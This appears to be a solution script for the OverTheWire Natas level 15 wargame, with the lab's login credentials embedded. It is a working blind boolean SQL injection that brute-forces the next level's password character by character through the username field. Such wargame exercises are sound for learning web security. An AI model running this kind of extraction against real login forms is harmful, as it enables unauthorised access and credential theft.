import string       # For password generation
import requests     # For http requests
from requests.auth import HTTPBasicAuth

# Basic htpp request variables
login = HTTPBasicAuth("natas15", "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx")
headers = {"Content-Type": "application/x-www-form-urlencoded"}
url = "http://natas15.natas.labs.overthewire.org/"

# Password generator
count = 1
password = ""
max_lenght = 32
valid_characters = string.digits + string.ascii_letters

# While we haven't found the password...
while count <= max_lenght + 1:
    # ... for each valid character (numbers, lowercase and uppercase)
    for c in valid_characters:
        # Our payload
        payload = "natas16\" AND substring(password, 1, " + str(count) + ") = \"" + password + c + "\" -- "
        response = requests.post(url, data = {"username": payload}, headers = headers, auth = login, verify = False)
        # We got a hit
        if "This user exists." in response.text:
            print("Found: " + password + c)
            password += c
            count += 1

print("Final password: " + password)
